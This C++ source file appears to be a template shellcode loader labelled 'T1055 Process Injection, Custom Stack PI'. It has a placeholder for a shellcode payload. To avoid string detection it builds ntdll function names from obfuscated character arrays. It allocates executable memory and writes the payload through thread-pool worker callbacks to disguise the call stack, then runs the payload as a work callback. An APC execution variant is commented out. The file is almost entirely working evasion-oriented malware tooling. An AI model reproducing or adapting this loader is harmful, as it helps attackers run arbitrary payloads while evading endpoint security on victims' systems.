/**
Editor: Thomas X Meng
T1055 Process Injection
Custom Stack PI (Local Injection)
**/
/***

*/
#include <windows.h>
#include <stdio.h>
#include <winternl.h>

//define SimpleSleep
void SimpleSleep(DWORD dwMilliseconds);


typedef NTSTATUS (NTAPI* TPALLOCWORK)(PTP_WORK* ptpWrk, PTP_WORK_CALLBACK pfnwkCallback, PVOID OptionalArg, PTP_CALLBACK_ENVIRON CallbackEnvironment);
typedef VOID (NTAPI* TPPOSTWORK)(PTP_WORK);
typedef VOID (NTAPI* TPRELEASEWORK)(PTP_WORK);

typedef struct _NTALLOCATEVIRTUALMEMORY_ARGS {
    UINT_PTR pNtAllocateVirtualMemory;   // pointer to NtAllocateVirtualMemory - rax
    HANDLE hProcess;                     // HANDLE ProcessHandle - rcx
    PVOID* address;                      // PVOID *BaseAddress - rdx; ULONG_PTR ZeroBits - 0 - r8
    PSIZE_T size;                        // PSIZE_T RegionSize - r9; ULONG AllocationType - MEM_RESERVE|MEM_COMMIT = 3000 - stack pointer
    ULONG permissions;                   // ULONG Protect - PAGE_EXECUTE_READ - 0x20 - stack pointer
} NTALLOCATEVIRTUALMEMORY_ARGS, *PNTALLOCATEVIRTUALMEMORY_ARGS;

typedef struct _NTWRITEVIRTUALMEMORY_ARGS {
    UINT_PTR pNtWriteVirtualMemory;      // pointer to NtWriteVirtualMemory - rax
    HANDLE hProcess;                     // HANDLE ProcessHandle - rcx
    PVOID address;                       // PVOID BaseAddress - rdx
    PVOID buffer;                        // PVOID Buffer - r8
    SIZE_T size;                         // SIZE_T NumberOfBytesToWrite - r9
    ULONG bytesWritten;
} NTWRITEVIRTUALMEMORY_ARGS, *PNTWRITEVIRTUALMEMORY_ARGS;


// typedef NTSTATUS(NTAPI* myNtTestAlert)(
//     VOID
// );

// typedef struct _NTTESTALERT_ARGS {
//     UINT_PTR pNtTestAlert;          // pointer to NtTestAlert - rax
// } NTTESTALERT_ARGS, *PNTTESTALERT_ARGS;

// https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ne-processthreadsapi-queue_user_apc_flags
typedef enum _QUEUE_USER_APC_FLAGS {
  QUEUE_USER_APC_FLAGS_NONE,
  QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
  QUEUE_USER_APC_CALLBACK_DATA_CONTEXT
} QUEUE_USER_APC_FLAGS;

typedef struct _NTQUEUEAPCTHREADEX_ARGS {
    UINT_PTR pNtQueueApcThreadEx;          // pointer to NtQueueApcThreadEx - rax
    HANDLE hThread;                         // HANDLE ThreadHandle - rcx
    HANDLE UserApcReserveHandle;            // HANDLE UserApcReserveHandle - rdx
    QUEUE_USER_APC_FLAGS QueueUserApcFlags; // QUEUE_USER_APC_FLAGS QueueUserApcFlags - r8
    PVOID ApcRoutine;                       // PVOID ApcRoutine - r9
    // PVOID SystemArgument1;                  // PVOID SystemArgument1 - stack pointer
    // PVOID SystemArgument2;                  // PVOID SystemArgument2 - stack pointer
    // PVOID SystemArgument3;                  // PVOID SystemArgument3 - stack pointer
} NTQUEUEAPCTHREADEX_ARGS, *PNTQUEUEAPCTHREADEX_ARGS;

typedef NTSTATUS (NTAPI *NtQueueApcThreadEx_t)(
    HANDLE ThreadHandle,
    HANDLE UserApcReserveHandle, // Additional parameter in Ex2
    QUEUE_USER_APC_FLAGS QueueUserApcFlags, // Additional parameter in Ex2
    PVOID ApcRoutine
);


extern "C" {
    VOID CALLBACK IWillBeBack(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    VOID CALLBACK WriteProcessMemoryCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    VOID CALLBACK NtQueueApcThreadCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    VOID CALLBACK NtTestAlertCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
}


unsigned char magiccode[] = ####SHELLCODE####;


int main(int argc, char *argv[]) {




    ///// Put everything after this line::!!!!

    ///



    LPVOID allocatedAddress = NULL;
    SIZE_T allocatedsize = sizeof(magiccode);

    //print the first 8 bytes of the magiccode and the last 8 bytes:
    printf("First 8 bytes: %02x %02x %02x %02x %02x %02x %02x %02x\n", magiccode[0], magiccode[1], magiccode[2], magiccode[3], magiccode[4], magiccode[5], magiccode[6], magiccode[7]);
    printf("Last 8 bytes: %02x %02x %02x %02x %02x %02x %02x %02x\n", magiccode[sizeof(magiccode) - 8], magiccode[sizeof(magiccode) - 7], magiccode[sizeof(magiccode) - 6], magiccode[sizeof(magiccode) - 5], magiccode[sizeof(magiccode) - 4], magiccode[sizeof(magiccode) - 3], magiccode[sizeof(magiccode) - 2], magiccode[sizeof(magiccode) - 1]);
    

	const char libName[] = { 'n', 't', 'd', 'l', 'l', 0 };
	const char NtAllocateFuture[] = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
    NTALLOCATEVIRTUALMEMORY_ARGS ntAllocateVirtualMemoryArgs = { 0 };
    ntAllocateVirtualMemoryArgs.pNtAllocateVirtualMemory = (UINT_PTR) GetProcAddress(GetModuleHandleA("ntdll"), NtAllocateFuture);
    ntAllocateVirtualMemoryArgs.hProcess = (HANDLE)-1;
    ntAllocateVirtualMemoryArgs.address = &allocatedAddress;
    ntAllocateVirtualMemoryArgs.size = &allocatedsize;
    ntAllocateVirtualMemoryArgs.permissions = PAGE_EXECUTE_READWRITE;


    /// Set workers
    FARPROC pTpAllocWork = GetProcAddress(GetModuleHandleA(libName), "TpAllocWork");
    FARPROC pTpPostWork = GetProcAddress(GetModuleHandleA(libName), "TpPostWork");
    FARPROC pTpReleaseWork = GetProcAddress(GetModuleHandleA(libName), "TpReleaseWork");

    PTP_WORK WorkReturn = NULL;
    // getchar();
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)IWillBeBack, &ntAllocateVirtualMemoryArgs, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);
    // getchar();
    printf("[+] Allocated size: %lu\n", allocatedsize);
    printf("[+] MagicCode size: %lu\n", sizeof(magiccode));
/// Write memory: 
    // if(allocatedAddress == NULL) {
    //     // printf("[-] Failed to allocate memory\n");
    //     printf("allocatedAddress: %p\n", allocatedAddress);
    // }
    // printf("allocatedAddress: %p\n", allocatedAddress);
    // if(allocatedsize != sizeof(magiccode)) {
    //     printf("[-] Allocated size is not the same as magiccode size\n");
    //     printf("[-] Allocated size: %lu\n", allocatedsize);
    //     printf("[+] MagicCode size: %lu\n", sizeof(magiccode));
    // }


	///Write process memory: 
    const char NtWriteFuture[] = { 'N', 't', 'W', 'r', 'i', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
    ULONG bytesWritten = 0;
    NTWRITEVIRTUALMEMORY_ARGS ntWriteVirtualMemoryArgs = { 0 };
    ntWriteVirtualMemoryArgs.pNtWriteVirtualMemory = (UINT_PTR) GetProcAddress(GetModuleHandleA(libName), NtWriteFuture);
    ntWriteVirtualMemoryArgs.hProcess = (HANDLE)-1;
    ntWriteVirtualMemoryArgs.address = allocatedAddress;
    ntWriteVirtualMemoryArgs.buffer = (PVOID)magiccode;
    ntWriteVirtualMemoryArgs.size = allocatedsize;
    ntWriteVirtualMemoryArgs.bytesWritten = bytesWritten;

    // // // / Set workers

    PTP_WORK WorkReturn2 = NULL;
    // getchar();
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn2, (PTP_WORK_CALLBACK)WriteProcessMemoryCustom, &ntWriteVirtualMemoryArgs, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn2);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn2);
    // printf("Bytes written: %lu\n", bytesWritten);
    if(WorkReturn2 == NULL) {
        printf("[-] Failed to write memory\n");
    } else {
        printf("[+] Memory written\n");
    }

    //####END####
    
    //// Execution part: 


    /// 2. Set workers to execute code, only works for local address, we may run a trampoline code to execute remote code: 
    PTP_WORK WorkReturn4 = NULL;
    // getchar();
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn4, (PTP_WORK_CALLBACK)allocatedAddress, NULL, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn4);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn4);
    printf("[+] magiccode executed. \n");
    // Wait for the magiccode to execute
    DWORD waitResult = WaitForSingleObject((HANDLE)-1, INFINITE); // Use a reasonable timeout as needed
    if (waitResult == WAIT_OBJECT_0) {
        printf("[+] magiccode execution completed\n");
    } else {
        printf("[-] magiccode execution wait failed\n");
    }

    // 3. APC execution:     
    // const char NtQueueFutureApcEx2Str[] = { 'N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x', '2', 0 };

    // // NtQueueApcThreadEx_t pNtQueueApcThread = (NtQueueApcThreadEx_t)GetProcAddress(GetModuleHandleA("ntdll"), NtQueueFutureApcEx2Str);

    // QUEUE_USER_APC_FLAGS apcFlags = QUEUE_USER_APC_FLAGS_NONE;
    // PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)allocatedAddress;

    // NTQUEUEAPCTHREADEX_ARGS ntQueueApcThreadExArgs = { 0 };
    // ntQueueApcThreadExArgs.pNtQueueApcThreadEx = (UINT_PTR) GetProcAddress(GetModuleHandleA("ntdll"), NtQueueFutureApcEx2Str);
    // ntQueueApcThreadExArgs.hThread = GetCurrentThread();
    // ntQueueApcThreadExArgs.UserApcReserveHandle = NULL;
    // ntQueueApcThreadExArgs.QueueUserApcFlags = apcFlags;
    // ntQueueApcThreadExArgs.ApcRoutine = (PVOID)apcRoutine;


    // /// Set workers

    // const char NtTestFutureStr[] = { 'N', 't', 'T', 'e', 's', 't', 'A', 'l', 'e', 'r', 't', 0 };
    // myNtTestAlert testAlert = (myNtTestAlert)GetProcAddress(GetModuleHandle("ntdll"), NtTestFutureStr);
    // // NTSTATUS result = pNtQueueApcThread(
    // //     GetCurrentThread(),  
    // //     NULL,  
    // //     apcFlags,  
    // //     (PVOID)apcRoutine,  
    // //     (PVOID)0,  
    // //     (PVOID)0,  
    // //     (PVOID)0 
    // //     );
    // // NTSTATUS result = pNtQueueApcThread(
    // //     GetCurrentThread(),  
    // //     NULL,  
    // //     apcFlags,  
    // //     (PVOID)apcRoutine
    // //     );
    // PTP_WORK WorkReturn3 = NULL;
    // getchar();
    // ((TPALLOCWORK)pTpAllocWork)(&WorkReturn3, (PTP_WORK_CALLBACK)NtQueueApcThreadCustom, &ntQueueApcThreadExArgs, NULL);
    // ((TPPOSTWORK)pTpPostWork)(WorkReturn3);
    // ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn3);
    // // QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), (ULONG_PTR)0);
	// testAlert();
    getchar();
    //// Execution end..

    return 0;
}


void SimpleSleep(DWORD dwMilliseconds)
{
    HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL); // Create an unsignaled event
    if (hEvent != NULL)
    {
        WaitForSingleObjectEx(hEvent, dwMilliseconds, FALSE); // Wait for the specified duration
        CloseHandle(hEvent); // Clean up the event object
    }
}